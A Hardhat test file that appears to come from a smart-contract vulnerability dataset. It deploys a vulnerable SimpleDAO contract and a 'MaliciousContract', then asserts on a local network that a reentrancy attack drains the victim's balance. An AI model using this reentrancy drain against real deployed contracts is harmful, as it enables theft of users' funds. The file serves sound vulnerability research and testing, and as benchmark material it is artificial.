const { loadFixture } = require('@nomicfoundation/hardhat-network-helpers');
const { expect } = require("chai");
const { ethers } = require("hardhat");
const path = require("path");
const fs = require("fs");

describe("Reentrancy Attack for simpleDAO.sol", function () {

    async function deployContracts() {
    // Deploy SimpleDAO contract
    const codePath = path.join(__dirname, '../../artifacts/contracts/dataset/reentrancy/simple_dao.sol/SimpleDAO.json');
    const json = JSON.parse(fs.readFileSync(codePath));
    const SimpleDAOFactory = await ethers.getContractFactory(json.abi, json.bytecode);
    const simpleDAO = await SimpleDAOFactory.deploy();
    await simpleDAO.waitForDeployment();

    // Deploy MaliciousContract with SimpleDAO address
    const MaliciousContractFactory = await ethers.getContractFactory('contracts/reentrancy/simple_dao_attack.sol:MaliciousContract');
    const maliciousContract = await MaliciousContractFactory.deploy(simpleDAO.target);
    await maliciousContract.waitForDeployment();
    
    //const [_, innocentAddress, attackerAddress] = [simpleDAO.target, maliciousContract.target];
    return {simpleDAO, maliciousContract}
    }

    it('sanity check: reentrancy/simpleDAO.sol', async function () {
      const {simpleDAO, maliciousContract} = await loadFixture(deployContracts);
      await expect(simpleDAO.donate(simpleDAO.target, {value:0})).to.not.be.reverted;
    });

  it("should successfully drain funds through reentrancy attack", async function () {
    const {simpleDAO, maliciousContract} = await loadFixture(deployContracts);
    const [_, innocentAddress, attackerAddress] = [,simpleDAO.target, maliciousContract.target];


    // We add 10 ether into victim contract
    await simpleDAO.donate( innocentAddress, {
        value: ethers.parseEther("10"),
      });
 
    // Check that at this point the Victimontract's balance is 10 ETH
    let balanceETH = await ethers.provider.getBalance(simpleDAO.target);
    expect(balanceETH).to.equal(ethers.parseEther("10"));

    // Initial deposit from hacker on victim contract
    await maliciousContract.deposit({value:  ethers.parseEther("1")});

    balanceETH = await ethers.provider.getBalance(simpleDAO.target);
    expect(balanceETH).to.equal(ethers.parseEther("11"));


    // Attacker calls the `attack` function on MaliciousContract
    // and sends 1 ETH
    await maliciousContract.attack(ethers.parseEther("1"));

    // Check balances after attack
    const maliciousContractBalance = await ethers.provider.getBalance(attackerAddress);
    const simpleDAOBalance = await ethers.provider.getBalance(innocentAddress);

    // Verify the attack was successful
    expect(maliciousContractBalance).to.be.above(ethers.parseEther("1")); 
    expect(simpleDAOBalance).to.be.below(ethers.parseEther("10"));
    
  });
});
